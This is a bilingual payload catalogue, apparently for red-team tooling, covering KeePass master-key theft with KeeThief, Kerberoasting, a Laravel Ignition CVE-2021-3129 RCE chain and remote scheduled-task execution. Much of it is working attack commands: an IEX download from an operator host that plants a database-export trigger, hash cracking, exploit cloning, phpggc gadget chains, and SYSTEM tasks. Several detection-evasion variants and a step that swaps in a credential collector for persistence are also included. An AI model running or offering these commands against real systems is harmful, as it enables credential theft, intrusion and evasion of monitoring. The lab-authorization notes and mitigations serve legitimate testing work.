description.zh: 定位 .kdbx 数据库与进程内存中的主密钥材料，验证密码管理器的文件与内存保护。
description.en: Locates the .kdbx database and extracts master key material from the unlocked process memory, demonstrating that memory access defeats the password strength of the vault itself.

overview.zh: 该 Payload 覆盖 KeePass 文件与进程保护审计场景，检验口令库文件的定位难度与运行中主密钥的内存可提取性。验证维度含全盘定位、配置目录检索与 KeeThief 内存提取三步，对应第 1 至第 3 步。
overview.en: This payload covers KeePass file and process protection auditing, testing how easily password-database files are located and running master keys are extracted from memory. Validation covers full-disk discovery, profile-directory search and KeeThief memory extraction, mapped to steps 1 through 3.

vulnerability.zh: 根因在于主密钥在解锁期间驻留进程内存且数据库文件散落用户目录：攻击者定位 .kdbx 后配合内存读取即可还原主密钥与全部条目，绕过口令强度限制。
vulnerability.en: The root cause is master keys resident in process memory while unlocked and database files scattered across user directories: after locating a .kdbx, an attacker pairs it with memory reads to recover the master key and all entries, bypassing password strength entirely.

exploitation.zh: 第 1 步全盘搜索 .kdbx 文件输出路径清单即定位完成；第 2 步在用户配置目录按深度限制递归检索并列出大小与修改时间；第 3 步加载 KeeThief 后从运行中的 KeePass 进程提取主密钥与数据库口令，输出即确认内存保护缺失。以主密钥或主口令还原为成功判据。占位符在全局变量菜单替换；仅在授权主机执行。
exploitation.en: In step 1, search the disk for .kdbx files and print the path list. In step 2, recursively search user profile directories with a depth limit, listing sizes and modification times. In step 3, load KeeThief and extract the master key and database passphrase from the running KeePass process; output confirms missing memory protection. Judge success by a recovered master key or passphrase. Replace placeholders via the global variables menu; execute only on authorized hosts.

mitigation.zh:
升级 KeePass/KeePassXC 至带进程内存防护的版本，锁定工作区后退出进程，数据库文件集中存储并限制目录枚举：
    winget upgrade KeePassXTeam.KeePassXC          # 或域内部署最新 KeePass 2.x MSI
    icacls "D:\Vaults" /inheritance:r /grant:r "CORP\VaultAdmins:(OI)(CI)F" "CORP\VaultUsers:(OI)(CI)RX"
    <FileCreate onmatch="include"><TargetFilename condition="end with">.kdbx</TargetFilename></FileCreate>
    修复后重放第 3 步，内存提取应失败或返回空。
mitigation.en: Upgrade KeePass to builds with memory protection, lock workspaces and close processes when idle, centralize database storage, and restrict directory enumeration. After the fix, replay step 3: memory extraction should fail or return nothing.

description.zh: 递归搜索 C 盘下所有 .kdbx 数据库文件；输出路径清单即锁定口令库的落盘位置，同时记录大小与时间用于判断活跃程度。
description.en: Recursively hunt *.kdbx across C:; the path list locates password vaults, with size and timestamps hinting at which are actively used.

description.zh: 在用户配置目录按深度与数量约束搜索 .kdbx；列出文件大小与修改时间即可筛出近期活跃使用的口令库，作为优先攻击目标。
description.en: Bound the search under profile directories by depth and count; the most recently written kdbx is the actively used vault to prioritize.

title.zh: 从进程内存提取主密钥
title.en: Extract the master key from process memory

description.zh: 加载 KeeThief 注入 KeePass 进程提取主密钥与解锁口令；拿到密钥即可离线打开第 2 步定位的数据库，导出其中保存的全部凭据。
description.en: Load KeeThief and pull the master key from the running KeePass process; with the key in hand, open the vault from step 2 offline and export every secret.

prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for KeePass File and Process Protection Audit are authorized in writing and reversible.

prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 内存转储含全部库条目明文——确认目标口令后立即销毁转储，不对生产用户的解锁进程操作。
opsecTips.en: Memory dumps expose every vault entry in plaintext — shred the dump once the target passphrase is confirmed and never touch production users' unlocked processes.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 无外联指纹预检规避变体

description.zh: 无外联指纹预检：只读运行中 KeePass 进程的模块表确认内存取材面（KeePass 组件在位），不触碰 .kdbx 文件读取监控、不外联下载 KeeThief 脚本；确认后再执行 execution 的内存提取步。判据：输出含 KeePass 安装路径的模块行。
description.en: Offline fingerprint preflight: reads the loaded-module list of the running KeePass process to confirm the in-memory extraction surface, touching neither .kdbx file-read telemetry nor any outbound KeeThief download; run the execution memory step afterwards. Success: module rows carrying the KeePass install path.

title.zh: 离线 hashcat 规避变体

wafBypass.command: keepass2john {LAB_KDBX_FILE} > kp.hash && hashcat -m 13400 kp.hash wordlist.txt -r rules/best64.rule

description.zh: 绕过目标侧持续操作：仅复制数据库文件后完全离线破解。成功判据：hashcat 恢复主口令。
description.en: Evades sustained on-target activity by copying the database once and cracking fully offline. Success: hashcat recovers the master password.

title.zh: 触发器持久导出规避变体

wafBypass.command: powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/KeePassConfig.ps1'); Add-KeePassConfigTrigger -Path '{LAB_KEEPASS_CFG}' -Action ExportDatabase -ExportPath C:\Windows\Temp -TriggerName exp"

description.zh: 绕过即时内存提取的窗口限制：用 KeeThief 的 Add-KeePassConfigTrigger 写入按合法 TypeGuid schema 构造的触发器（打开数据库事件到导出动作），用户打开库时自动把库导出为 CSV。成功判据：打开库后 C:\Windows\Temp 下导出文件生成。
description.en: Evades the extraction time window by using KeeThief's Add-KeePassConfigTrigger to plant a trigger built with the valid TypeGuid schema (database-open event mapped to an export action); opening the database exports it as CSV. Success: the export file appears under C:\Windows\Temp.

explanation.zh: 内存加载 KeeThief 配置模块
explanation.en: load the KeeThief config module in memory

explanation.zh: KeeThief 触发器写入函数（自带合法 TypeGuid 构造）
explanation.en: KeeThief trigger-writing function with valid TypeGuids

explanation.zh: 目标 KeePass 配置文件
打开数据库事件触发导出

description.zh: 全盘搜索 .kdbx 数据库；输出数据库路径清单即定位完成。
description.en: Search the disk for .kdbx databases; the printed path list completes locating.

title.zh: 搜索 KeePass 数据库文件

description.zh: 在用户配置目录递归搜索 .kdbx 数据库文件并列出大小与修改时间，定位可离线分析的口令库。
description.en: Recursively searches the user profile for .kdbx database files, listing size and modification time to locate password databases for offline analysis.

title.zh: 内存提取 KeePass 主密钥
title.en: Extract the KeePass master key from memory

description.zh: 加载 KeeThief 后从 KeePass 进程内存提取主密钥与数据库口令。
description.en: Loads KeeThief and extracts the master key and database passphrase from the KeePass process memory.

name.zh: Kerberoasting 服务票据离线破解

description.zh: 用 Rubeus/GetUserSPNs 请求目标 SPN 的服务票据并导出离线破解，以破解成功证明服务账号口令强度不足。
description.en: Requests service tickets for target SPNs with Rubeus or GetUserSPNs and exports them for offline cracking, where a recovered password proves the service account falls below the domain's password-strength baseline.

subCategory.zh: 域凭据与 LSA 提取

overview.zh: 该 Payload 覆盖 Kerberoasting 单账号暴露验证场景，检验域内服务账号口令强度与票据可离线破解性。验证维度含 SPN 枚举、票据申请、导出、Rubeus 统计、Impacket 请求与离线破解六步，对应第 1 至第 6 步。
overview.en: This payload covers Kerberoasting single-account exposure validation, testing domain service-account password strength and offline crackability of tickets. Validation covers SPN enumeration, ticket request, export, Rubeus statistics, Impacket request and offline cracking, mapped to steps 1 through 6.

vulnerability.zh: 根因在于 Kerberos 服务票据以服务账号口令派生密钥加密且任何域用户都可申请：弱口令服务账号的票据被导出后可离线穷举，口令一旦命中即获得该账号身份。
vulnerability.en: The root cause is Kerberos service tickets encrypted with keys derived from the service-account password and requestable by any domain user: tickets for weak-password accounts can be exported and brute-forced offline, and a hit grants that account's identity.

exploitation.zh: 第 1 步用 setspn 查询全部 SPN 列出服务账号；第 2 步以 .NET 请求目标 SPN 票据入缓存；第 3 步用 mimikatz 导出 .kirbi 文件；第 4 步以 Rubeus stats 统计可请求账号；第 5 步用 GetUserSPNs.py 输出可破解哈希；第 6 步以 hashcat 配字典破解，跑出口令即确认弱凭据。占位符在全局变量菜单替换；仅限授权实验域。
exploitation.en: In step 1, list service accounts by enumerating all SPNs with setspn. In step 2, request the target SPN ticket via .NET into cache. In step 3, export .kirbi files with mimikatz. In step 4, tally requestable accounts with Rubeus stats. In step 5, emit crackable hashes with GetUserSPNs.py. In step 6, crack with hashcat and a wordlist; a recovered password confirms weak credentials. Replace placeholders via the global variables menu; authorized lab domain only.

mitigation.zh:
服务账号改用 gMSA 或 25 位以上随机口令并强制 AES256，对 RC4 票据请求量与异常 TGS 申请建立告警：
    New-ADServiceAccount -Name svc_web -DNSHostName svc_web.corp.local `
      -PrincipalsAllowedToRetrieveManagedPassword "CORP\Tier0-Servers" -KerberosEncryptionType AES256
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
      Where-Object { $_.Message -match "0x17" }        # RC4 etype 告警
    修复后重放第 6 步，弱口令应不再可破解且监控捕获第 2、5 步的申请行为。
mitigation.en: Move service accounts to gMSA or 25-plus-character random passwords, enable AES encryption, and alert on anomalous ticket request volume. After the fix, replay step 6: weak passwords should no longer crack, and monitoring should catch the step 2 and 5 requests.

title.zh: 枚举域内 SPN 服务账号

description.zh: 用 setspn 的全域查询列出全部 SPN 记录；输出 HTTP、MSSQL 等服务账号清单即锁定可申请票据的高价值目标，优先挑选高权限账号。
description.en: Query every SPN in the domain with setspn; the HTTP/MSSQL service account list marks the high-value targets whose tickets can be requested.

description.zh: 通过 .NET 的 KerberosRequestorSecurityToken 为目标 SPN 申请服务票据；命令执行后本机票据缓存新增 TGS 即拿到可离线破解的凭据材料。
description.en: Request a ticket for the target SPN via KerberosRequestorSecurityToken; a fresh TGS in the local cache is the offline-cracking material.

description.zh: 用 mimikatz 的 kerberos::list /export 导出缓存中的票据；当前目录生成 .kirbi 文件即完成凭据落盘，可拷回攻击机进入破解环节。
description.en: Export cached tickets with mimikatz kerberos::list /export; the .kirbi file appearing on disk is ready to copy back for cracking.

title.zh: 换用 Impacket 一体化通道
title.en: Switch to the Impacket all-in-one channel

description.zh: 用 GetUserSPNs.py 的 request 模式一条命令完成枚举与请求，直接输出可破解哈希；无需登录图形机，与前三步互为备份，出哈希即可继续。
description.en: Run GetUserSPNs.py -request to enumerate and fetch in one shot, printing crackable hashes directly; no desktop logon needed and it backs up the earlier steps.

title.zh: 离线破解服务账号口令

description.zh: 用 hashcat 的 13100 模式加载字典破解票据哈希；跑出明文口令即获得服务账号凭据，可横向移动到该账号注册的全部服务主机。
description.en: Crack the ticket hash with hashcat mode 13100; the recovered plaintext yields a service-account credential for lateral movement to every host running that SPN.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Kerberoasting 单账号暴露验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Kerberoasting Single-Account Exposure Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Kerberoasting 单账号暴露验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Kerberoasting Single-Account Exposure Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 导出的服务票据是可离线破解的凭据材料，破解会话结束后立即销毁票据文件与候选口令表；SPN 请求保持正常扫描节奏，避免域控 4769 事件激增触发告警。
opsecTips.en: Exported service tickets are crackable credential material — destroy ticket files and candidate wordlists as soon as the cracking session ends, and pace SPN requests so 4769 events on the domain controller stay near baseline.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: RC4 定向请求规避变体

description.zh: 绕过全量 SPN 请求的批量告警（Kerberos 服务票据洪泛检测）：仅定向请求单账号 RC4 票据。成功判据：kerb.txt 含单账号可破解哈希。
description.en: Evades bulk-SPN request alerts (service-ticket flooding detection) by requesting only one targeted account's RC4 ticket. Success: kerb.txt contains one crackable hash.

description.zh: 绕过 etype23(RC4) 弱加密票据告警：请求 AES 票据（etype 0x11/0x12），事件侧为正常加密协商。成功判据：返回 AES 哈希且可离线破解。
description.en: Evades etype23 (RC4) weak-ticket alerts by requesting AES tickets (etype 0x11/0x12), which look like normal crypto negotiation. Success: an AES hash returns and cracks offline.

title.zh: 变体：经 GC 3268 通道枚举 SPN

description.zh: SPN 枚举可经全局目录 3268 端口的 LDAP 通道完成，减少对域控 389 的直接查询面；但服务票据申请（TGS-REQ）恒走 KDC 88 端口，此变体无法绕过对 88 的监控。成功判据：3268 返回 SPN 清单。
description.en: SPN enumeration can run over the global-catalog LDAP port 3268 to reduce direct queries to the DC, but ticket requests (TGS-REQ) always hit the KDC on port 88, so this variant does not evade port-88 monitoring. Success: the SPN list returns via 3268.

explanation.zh: 连接全局目录 3268 端口
explanation.en: connect to the global catalog on port 3268
bind as the querying domain account

title.zh: 枚举域内 SPN 服务账号

description.zh: 用 setspn 查询域内全部 SPN 记录，列出可申请票据的服务账号清单。
description.en: Queries all SPN records in the domain with setspn to list service accounts whose tickets can be requested.

title.en: Request a ticket for a specific service

description.zh: 通过 .NET KerberosRequestorSecurityToken 为目标 SPN 申请 Kerberos 服务票据，使票据落入本机缓存供导出。
description.en: Uses the .NET KerberosRequestorSecurityToken class to request a Kerberos service ticket for the target SPN so it lands in the local cache for export.

description.zh: 用 Mimikatz 导出 Kerberos 票据；当前目录生成 .kirbi 票据文件即导出成功，经 kirbi2john 等转换为哈希格式后可交离线破解。
description.en: Export Kerberos tickets with Mimikatz; .kirbi ticket files in the current directory mean the export succeeded for offline cracking.

description.zh: 用 Rubeus /stats 统计可请求票据的账号与加密类型；输出列出带 SPN 的账号即确认 Kerberoast 暴露面。
description.en: Run Rubeus /stats to profile ticket-requestable accounts and encryption types; output listing SPN-bearing accounts confirms the Kerberoast exposure.

title.zh: Impacket 请求并导出服务票据
title.en: Request and export service tickets with Impacket

description.zh: 用 Impacket GetUserSPNs.py 请求域内服务账号票据并输出可离线破解的哈希。
description.en: Uses Impacket GetUserSPNs.py to request domain service-account tickets and emit hashes for offline cracking.

description.zh: 用 Hashcat -m 13100 离线破解导出的票据；跑出明文口令即确认服务账号弱口令。
description.en: Crack the exported tickets offline with hashcat -m 13100; recovering a plaintext password confirms a weak service-account credential.

name.zh: Laravel 配置与反序列化回归

description.zh: 覆盖 Laravel 框架漏洞利用链验证：从 Ignition CVE-2021-3129 RCE 与 PHPGGC 生成框架利用链，到 .env 配置泄露读取，再到 Tinker 加密数据解密，用于确认配置暴露与反序列化风险。
description.en: Covers Laravel exploit-chain validation: from Ignition CVE-2021-3129 RCE and PHPGGC-generated framework chains through .env configuration leak reads to Tinker decryption of encrypted data, confirming configuration exposure and deserialization risk.

overview.zh: Laravel 配置与反序列化回归针对 Laravel 部署暴露与反序列化入口的组合场景。覆盖 Ignition CVE-2021-3129 RCE、PHPGGC 框架链生成、.env 配置泄露与 Tinker 解密四类验证维度。
overview.en: The Laravel configuration and deserialization regression targets combined scenarios of Laravel deployment exposure and deserialization entries. It covers four verification dimensions: Ignition CVE-2021-3129 RCE, PHPGGC framework-chain generation, .env configuration leakage, and Tinker decryption.

vulnerability.zh: 根因有两类：Ignition 错误页在调试模式暴露时允许通过 phar:// 流触发文件包含；.env 直接回源则泄露 APP_KEY，持有密钥即可伪造签名并解密 Laravel 加密数据，反序列化入口配合 PHPGGC 链升级为命令执行。
vulnerability.en: There are two root causes: the Ignition error page, when exposed in debug mode, allows file inclusion via phar:// streams; and a directly served .env leaks APP_KEY, enabling signature forgery and decryption of Laravel-encrypted data, while a deserialization entry combined with PHPGGC chains escalates to command execution.

exploitation.zh: 按 Payload 列表顺序使用：先按第 3 步请求 /.env 等路径，返回 APP_KEY 即配置泄露；再用第 1 步脚本对 /_ignition/execute-solution 触发 phar:// 包含实现 RCE；有反序列化入口时用第 2 步 phpggc 生成 Laravel/RCE1、RCE2、RCE4、RCE5、RCE9 链逐条投递；第 4 步在 tinker 中解密泄露数据。被拦截时改用路径变形枚举 .env。
exploitation.en: Use payloads in list order: request /.env and siblings per step 3—a returned APP_KEY is configuration leakage; then trigger phar:// inclusion for RCE against /_ignition/health-check with step 1's script; with a deserialization entry, generate and deliver the Laravel/RCE1, RCE2, RCE4, RCE5, RCE9 chains via step 2's phpggc one by one; step 4 decrypts leaked data in tinker. If blocked, use path-variant .env enumeration.

mitigation.zh:
生产关闭调试、移除 Ignition（或升级修复 CVE-2021-3129 的 2.5.2+），Web 根仅指向 public 使 .env 不可回源；轮换已泄露的 APP_KEY 并重加密数据、升级依赖。
    # .env
    APP_ENV=production
    APP_DEBUG=false
    # Nginx：拒绝敏感文件回源
    location ~ /\.(env|git) { deny all; return 404; }
    composer remove facade/ignition --dev
mitigation.en: Disable debug in production and remove the /_ignition route, point the web root at public so .env cannot be fetched, rotate any exposed APP_KEY, and re-encrypt data; upgrade Laravel and dependencies. After the fix, replay steps 1 and 3 and confirm the error page and .env are unreachable while the app works normally.

description.zh: 依次请求 /.env、/../.env 与 /public/.env 读取 APP_KEY 与数据库连接信息。命中判据：返回 APP_KEY 与 DB 凭据。
description.en: Request /.env variants to pull APP_KEY and DB credentials. Success: APP_KEY and DB creds are returned.

attackChain.payload:
GET /.env HTTP/1.1 
 GET /../.env HTTP/1.1 
 GET /public/.env HTTP/1.1 
 # APP_KEY=base64:... 
 # DB_HOST=localhost 
 # DB_DATABASE=laravel 
 # DB_USERNAME=root 
 # DB_PASSWORD=password

description.zh: 进入 artisan tinker 用 Crypt::decryptString 还原拿到的加密值。命中判据：密文被成功解密出明文。
description.en: Use tinker's Crypt::decryptString with the leaked APP_KEY. Success: ciphertexts decrypt to plaintext.

title.zh: 利用 Ignition 漏洞执行

description.zh: 经 /_ignition/execute-solution 配合 phar:// 流触发文件包含，运行利用脚本实现执行。命中判据：脚本返回命令输出。
description.en: Hit /_ignition/execute-solution with a phar:// based file delete/include chain. Success: the exploit returns command output.

description.zh: 用 phpggc 生成 RCE1 到 RCE9 五条链，配合泄露的 APP_KEY 构造签名载荷投递。命中判据：生成串可触发 system 执行。
description.en: Generate phpggc RCE1-RCE9 chains and forge signed payloads with APP_KEY. Success: a chain triggers system.

description.zh: .env 路径被限制时用 ..%2f 与双重编码变形枚举各环境文件。命中判据：变形路径读到配置内容。
description.en: When /.env is restricted, try ..%2f and double-encoded variants. Success: a mutated path returns config.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Laravel 配置与反序列化回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Laravel Configuration and Deserialization Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: Laravel 配置与反序列化回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Laravel Configuration and Deserialization Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: Ignition/PHPGGC 载荷真实执行——限定 marker 动作；.env 读取内容中的密钥形态在报告中脱敏。
opsecTips.en: Ignition and PHPGGC payloads really execute — restrict to marker actions, and redact secret shapes found in .env reads from the report.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 用原样、其他环境文件名（.env.example/.env.local/.env.production）、跨目录（/../.env）与单次/双重 URL 编码共 7 种路径形式探测 .env，验证仅匹配固定路径的黑名单可被变形绕过。
description.en: Probe .env with seven path forms spanning traversal and single/double URL encoding, verifying blacklists keyed to fixed paths can be evaded.

execution.command:
# Laravel Ignition RCE（CVE-2021-3129） 
 git clone https://github.com/zhzyker/CVE-2021-3129 
 cd CVE-2021-3129 
 python3 exp.py http://{LAB_APP} 
 phpggc Laravel/RCE1 system id > payload 
 POST /_ignition/execute-solution HTTP/1.1 
 Content-Type: application/json 
 {"solution":"...","parameters":{"viewFile":"phar://..."}}

description.zh: 克隆 zhzyker/CVE-2021-3129 利用脚本并指定目标，经 /_ignition/execute-solution 的 viewFile 参数配合 phpggc 生成的 phar:// 流与 php://filter 链触发文件包含，实现远程代码执行。
description.en: Clone the CVE-2021-3129 exploit script against the target and trigger file inclusion via /_ignition/health-check with a phar:// stream for remote code execution.

title.zh: 生成 PHPGGC Laravel 利用链

execution.command:
phpggc Laravel/RCE1 system 'id'
phpggc Laravel/RCE2 system 'id'
phpggc Laravel/RCE4 system 'id'
phpggc Laravel/RCE5 system 'id'
phpggc Laravel/RCE9 system 'id'

description.zh: 用 phpggc 依次生成 Laravel/RCE1、RCE2、RCE4、RCE5、RCE9 五条 gadget 链，验证在获得反序列化入口后可构造执行 id 的利用串。
description.en: Use phpggc to build the Laravel/RCE1, RCE2, RCE4, RCE5, and RCE9 gadget chains, verifying an id-executing payload can be produced once a deserialization entry point is found.

execution.command:
GET /.env HTTP/1.1 
 GET /../.env HTTP/1.1 
 GET /public/.env HTTP/1.1 
 # APP_KEY=base64:... 
 # DB_HOST=localhost 
 # DB_DATABASE=laravel 
 # DB_USERNAME=root 
 # DB_PASSWORD=password

description.zh: 依次请求 /.env、/../.env 与 /public/.env 并展示泄露出的 APP_KEY 与数据库连接信息，验证配置文件可直接回源。
description.en: Request /.env, /../.env, and /public/.env in turn and show the leaked APP_KEY and database credentials, verifying the configuration file is directly retrievable.

title.zh: 用 Tinker 解密泄露数据

description.zh: 进入 tinker 交互后调用 Crypt::decryptString 解密泄露的加密值，验证拿到 APP_KEY 后可还原任意 Laravel 加密数据。
description.en: Enter tinker and call Crypt::decryptString on the leaked ciphertext, verifying that possession of the APP_KEY decrypts any Laravel-encrypted value.

name.zh: AtExec 计划任务远程执行

description.zh: 通过 Task Scheduler（at/schtasks）远程创建任务执行，验证计划任务通道授权。
description.en: Registers one-shot scheduled tasks remotely through the ATSVC pipe with schtasks, where the task runs as SYSTEM and leaves no resident artifact, showing why 4698 task-creation monitoring is the primary control.

overview.zh: 远程计划任务授权验证覆盖计划任务远程执行场景：针对持有目标管理员凭据的测试主体，验证能否经任务计划程序管道远程注册一次性任务并回传命令输出。验证维度涵盖 atexec.py 自动化路径与 schtasks 原生命令两条入口。
overview.en: Remote Scheduled-Task Authorization Validation covers remote scheduled-task execution: for a test principal holding target administrator credentials, verify whether one-shot tasks can be registered remotely via the Task Scheduler pipe and return command output. Verification dimensions cover the automated atexec.py path and the native schtasks command.

vulnerability.zh: 根因是任务计划程序服务允许管理员主体通过 ATSVC 管道远程注册任务，任务默认以 SYSTEM 执行且一次性触发后不留常驻项；缺少 4698 任务创建监控时，该通道近乎静默，适合作为横向执行的低痕迹入口。
vulnerability.en: The root cause is that the Task Scheduler service lets administrators register tasks remotely via the ATSVC pipe; tasks run as SYSTEM and leave no resident item after a one-shot trigger. Without 4698 task-creation monitoring the channel is nearly silent, making it a low-footprint lateral-execution entry.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 atexec.py 远程执行 whoami，任务触发后回传输出且目标可见 4698 事件即确认成功；第 2 步用 schtasks /create /s 指定一次性触发时间复现，观察 4698/4699 事件对。两条路径均以 SYSTEM 执行且即时清理，适合验证凭据有效性与命令回传链路后转为其他持久化手段。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 executes whoami remotely with atexec.py — returned output after the task fires plus a 4698 event on the target confirms success; step 2 replays with schtasks /create /s using a one-shot trigger time and observes the 4698/4699 event pair. Both paths run as SYSTEM and self-clean, suiting credential validation and command-return checks before switching to other persistence. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
任务计划程序远程管理限管理网段专用账号，收紧远程任务注册权限，对 4698/4699 告警并审计任务 XML 异常命令行：
    AuditPol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
    New-NetFirewallRule -DisplayName "SMB-Mgmt-Only" -Protocol TCP -LocalPort 445 -RemoteAddress 10.0.10.0/24
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698} | ? Message -match "cmd|powershell"
    修复后用第 1 步样例回归，远程任务注册应返回拒绝错误。
mitigation.en: Restrict Task Scheduler remote management to dedicated management-segment accounts, tighten remote task registration rights, alert on 4698/4699 events, and audit task XML for anomalous command lines. After the fix, regress with the step 1 sample: remote task registration must return an access-denied error.

title.zh: 计划任务远程执行命令

description.zh: 用 atexec.py 以口令或哈希登录目标执行 whoami；返回命令结果即确认任务计划服务可被远程驱动执行任意指令。
description.en: Run atexec.py with credentials and whoami; the returned output proves the task scheduler service can be driven remotely for arbitrary commands.

title.zh: 原生 schtasks 植入任务

description.zh: 用 schtasks /create /s 目标 /tn evil /tr "cmd /c whoami" /sc once 创建单次任务；任务列表出现 evil 且到点运行即载荷送达目标。
description.en: Create the once-scheduled evil task on the target with schtasks /create; the task appearing in the list and firing on schedule confirms payload delivery.

description.zh: 把 /tr 参数指向回连程序或凭据收集脚本并加 /f 重新创建同名任务；目标主机按计划执行新载荷即获得可持续利用的命令执行通道。
description.en: Repoint /tr at a callback binary or credential collector and recreate the task; the target executing the new payload on schedule yields a persistent execution channel.

description.zh: 用 schtasks /delete /s {LAB_HOST} /tn evil /f 清理目标上已执行的任务；计划任务面板与日志不再残留条目即横向动作收尾完成。
description.en: Remove the executed task with schtasks /delete /tn evil; no leftover entries in the panel or logs closes out the lateral action.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 远程计划任务授权验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Remote Scheduled-Task Authorization Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: 远程计划任务授权验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Remote Scheduled-Task Authorization Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 计划任务以 SYSTEM 执行——任务动作只允许 marker 命令；创建与删除都记录任务名供审计对账。
opsecTips.en: Scheduled tasks run as SYSTEM — allow only marker commands as the action, and record task names for both creation and deletion so audit can reconcile.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 原生 schtasks 伪装规避变体

wafBypass.command: schtasks /create /s {LAB_HOST} /u {LAB_DOMAIN}\{LAB_USER} /p {LAB_PASSWORD} /tn "\Microsoft\Windows\Health" /tr "cmd /c whoami > C:\Windows\Temp\a.log" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /s {LAB_HOST} /tn "\Microsoft\Windows\Health"

description.zh: 绕过 atexec.py 的 TS 文件与命名管道特征：原生 schtasks 加微软命名空间任务路径伪装。成功判据：任务执行且 a.log 生成。
description.en: Evades atexec.py TS-file and named-pipe signatures by using native schtasks with a Microsoft-namespace task path for camouflage. Success: the task runs and a.log appears.

wafBypass.command: powershell -nop -c "$st=(Get-Date).AddMinutes(2).ToString('HH:mm'); schtasks /create /s {LAB_HOST} /u {LAB_DOMAIN}\{LAB_USER} /p {LAB_PASSWORD} /tn W32Delay /tr 'cmd /c whoami > C:\Windows\Temp\a.log' /sc once /st $st /ru SYSTEM /f"

description.zh: 绕过认证与执行同秒关联的时间线检测：任务延迟两分钟后触发，错开事件关联窗口。成功判据：延迟后 a.log 生成。
description.en: Evades timeline correlation of auth and execution in the same second by delaying the task two minutes to desynchronize the event window. Success: a.log appears after the delay.

explanation.en: compute the time two minutes ahead

explanation.zh: 按计算时刻一次性触发
explanation.en: run once at the computed time

title.zh: 输出转存共享规避变体

description.zh: 绕过 TS 文件回读特征：结果直写操作机共享，不经目标临时文件。成功判据：at.txt 含执行身份。
description.en: Evades TS-file readback signatures by writing results straight to the operator share, skipping target temp files. Success: at.txt contains the execution identity.

title.zh: 计划任务远程执行命令
title.en: Remote Scheduled-Task Authorization Validation Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_ATEXEC_E_1 与蓝队日志；成功时计划任务执行并回传 whoami 输出，目标可见 4698 任务创建事件。
